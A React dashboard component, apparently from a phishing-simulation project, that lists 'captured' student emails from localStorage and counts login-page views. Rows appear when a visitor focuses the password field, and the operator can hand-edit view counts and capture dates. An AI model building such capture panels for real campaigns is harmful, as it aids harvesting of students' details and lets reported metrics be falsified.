import React, { useState, useEffect } from 'react';
import { Link } from 'react-router-dom';

export default function Counter() {
  const [records, setRecords] = useState([]);
  const [pageViews, setPageViews] = useState(0);

  const updateDashboard = () => {
    const storedData = localStorage.getItem('captured_emails');
    const parsedRecords = storedData ? JSON.parse(storedData) : [];
    const cleanedRecords = parsedRecords.map(record => {
      if (record.savedAt && record.savedAt.includes(',')) {
        return { ...record, savedAt: record.savedAt.split(',')[0] };
      }
      return record;
    });
    setRecords(cleanedRecords);

    const views = parseInt(localStorage.getItem('login_views')) || 0;
    setPageViews(views);
  };

  useEffect(() => {
    document.title = "Student Emails Dashboard";
    updateDashboard();
    window.addEventListener('storage', updateDashboard);
    return () => {
      window.removeEventListener('storage', updateDashboard);
    };
  }, []);

  const handleEditViews = () => {
    const newCount = window.prompt("Modify total login page open metrics:", pageViews);
    if (newCount === null || newCount.trim() === "" || isNaN(newCount)) return;
    
    localStorage.setItem('login_views', parseInt(newCount));
    setPageViews(parseInt(newCount));
    window.dispatchEvent(new Event('storage'));
  };

  const handleEditDate = (indexToEdit, e) => {
    // Prevent clicking the cell from triggering if they clicked the delete button
    if (e.target.closest('.delete-btn')) return;

    const currentRecord = records[indexToEdit];
    const newDate = window.prompt(`Edit date for ${currentRecord.email}:`, currentRecord.savedAt);
    
    if (newDate === null || newDate.trim() === "") return;

    const updatedDataset = [...records];
    updatedDataset[indexToEdit] = { ...currentRecord, savedAt: newDate.trim() };

    setRecords(updatedDataset);
    localStorage.setItem('captured_emails', JSON.stringify(updatedDataset));
    window.dispatchEvent(new Event('storage'));
  };

  // NEW FEATURE: Removes a single targeted email row from localStorage
  const handleDeleteRow = (indexToDelete, emailAddress, e) => {
    e.stopPropagation(); // Stops the row edit prompt from popping up
    
    if (window.confirm(`Are you sure you want to completely remove ${emailAddress} from the log?`)) {
      const updatedDataset = records.filter((_, index) => index !== indexToDelete);
      
      setRecords(updatedDataset);
      localStorage.setItem('captured_emails', JSON.stringify(updatedDataset));
      
      // Sync change instantly across any other open simulation tabs
      window.dispatchEvent(new Event('storage'));
    }
  };

  const visibleRecords = records.slice(0, 250);

  return (
    <>
      <style>{`
        :root { --font-sans: ui-sans-serif, system-ui, sans-serif; --font-mono: ui-monospace, monospace; }
        .dashboard-body { background-color: #0b0f19; min-height: 100vh; width: 100%; display: flex; align-items: center; justify-content: center; font-family: var(--font-sans); padding: 40px 16px; box-sizing: border-box; }
        .dashboard-main { width: 100%; max-width: 768px; margin: 0 auto; }
        .dashboard-card { background-color: #111827; color: #ffffff; border-radius: 16px; border: 1px solid rgba(255, 255, 255, 0.1); box-shadow: 0 18px 60px rgba(0, 0, 0, 0.55); padding: 24px; box-sizing: border-box; }
        .header-row { display: flex; align-items: flex-start; justify-content: space-between; gap: 16px; }
        .main-title { font-size: 20px; font-weight: 600; margin: 0; }
        .sub-title { font-size: 14px; color: rgba(255, 255, 255, 0.7); margin-top: 4px; }
        .status-badge { font-size: 12px; padding: 4px 8px; border-radius: 9999px; background: rgba(255, 255, 255, 0.1); border: 1px solid rgba(255, 255, 255, 0.1); white-space: nowrap; }
        .stats-grid { margin-top: 32px; display: grid; gap: 16px; grid-template-columns: repeat(2, minmax(0, 1fr)); }
        .stat-box { background-color: rgba(0, 0, 0, 0.2); border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 12px; padding: 20px; }
        .stat-box.editable { cursor: pointer; transition: background 0.15s; }
        .stat-box.editable:hover { background-color: rgba(255, 255, 255, 0.03); }
        .stat-label { font-size: 14px; color: rgba(255, 255, 255, 0.7); }
        .stat-number { margin-top: 8px; font-size: 48px; font-weight: 600; letter-spacing: -0.025em; font-variant-numeric: tabular-nums; }
        .stat-desc { margin-top: 8px; font-size: 12px; color: rgba(255, 255, 255, 0.5); }
        .table-section { margin-top: 24px; background-color: rgba(0, 0, 0, 0.2); border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 12px; overflow: hidden; }
        .table-header { padding: 12px 16px; border-bottom: 1px solid rgba(255, 255, 255, 0.1); font-size: 14px; font-weight: 500; color: rgba(255, 255, 255, 0.8); }
        .table-scroll { overflow-x: auto; max-height: 420px; overflow-y: auto; }
        .data-table { width: 100%; text-align: left; font-size: 14px; border-collapse: collapse; }
        .data-table thead { position: sticky; top: 0; background-color: #0f172a; color: rgba(255, 255, 255, 0.6); z-index: 10; }
        .data-table th { padding: 8px 16px; font-weight: 500; }
        .data-row { border-bottom: 1px solid rgba(255, 255, 255, 0.05); transition: background 0.15s; cursor: pointer; user-select: none; }
        .data-row:hover { background-color: rgba(255, 255, 255, 0.05); }
        .data-cell-email { padding: 12px 16px; font-family: var(--font-mono); color: rgba(255, 255, 255, 0.9); word-break: break-all; }
        .data-cell-date { padding: 12px 16px; color: rgba(255, 255, 255, 0.6); white-space: nowrap; }
        
        /* Delete button custom micro-styles */
        .delete-btn {
          background: transparent;
          color: #ef4444;
          border: none;
          padding: 6px 12px;
          font-size: 12px;
          font-weight: 500;
          cursor: pointer;
          border-radius: 4px;
          transition: all 0.15s;
        }
        .delete-btn:hover {
          background: rgba(239, 68, 68, 0.15);
          color: #f87171;
        }
        .portal-link { font-size: 11px; color: rgba(255, 255, 255, 0.4); text-decoration: underline; margin-top: 4px; display: inline-block; }
      `}</style>

      <div className="dashboard-body">
        <main className="dashboard-main">
          <section className="dashboard-card">
            
            <div className="header-row">
              <div>
                <h1 className="main-title">Student emails</h1>
                <p className="sub-title">Captured metrics panel configuration.</p>
              </div>
              <div style={{ textAlign: 'right' }}>
                <div className="status-badge">Realtime: on</div>
                <Link to="/" className="portal-link">&larr; Go to Login</Link>
              </div>
            </div>

            <div className="stats-grid">
              <div className="stat-box">
                <div className="stat-label">Total saved</div>
                <div className="stat-number">{records.length === 0 ? "—" : records.length}</div>
              </div>
              
              <div className="stat-box editable" onClick={handleEditViews} title="Click to override view count metrics">
                <div className="stat-label">Page Opened</div>
                <div className="stat-number">{pageViews === 0 ? "—" : pageViews}</div>
                <p className="stat-desc">Tracks total initial landings on form interface portals.</p>
              </div>
            </div>

            <div className="table-section">
              <div className="table-header">Emails</div>
              <div className="table-scroll">
                <table className="data-table">
                  <thead>
                    <tr>
                      <th style={{ width: '50%' }}>Email</th>
                      <th style={{ width: '30%' }}>Saved at</th>
                      <th style={{ width: '20%', textAlign: 'center' }}>Actions</th>
                    </tr>
                  </thead>
                  <tbody>
                    {visibleRecords.map((record, index) => (
                      <tr key={index} onClick={(e) => handleEditDate(index, e)} className="data-row">
                        <td className="data-cell-email">{record.email}</td>
                        <td className="data-cell-date">{record.savedAt}</td>
                        <td style={{ textAlign: 'center', padding: '8px' }}>
                          <button 
                            className="delete-btn" 
                            onClick={(e) => handleDeleteRow(index, record.email, e)}
                          >
                            Remove
                          </button>
                        </td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>

              {records.length === 0 && (
                <p className="empty-text">
                  No rows yet. Entries appear after someone focuses the password field with a valid email in the username field.
                </p>
              )}
            </div>

          </section>
        </main>
      </div>
    </>
  );
}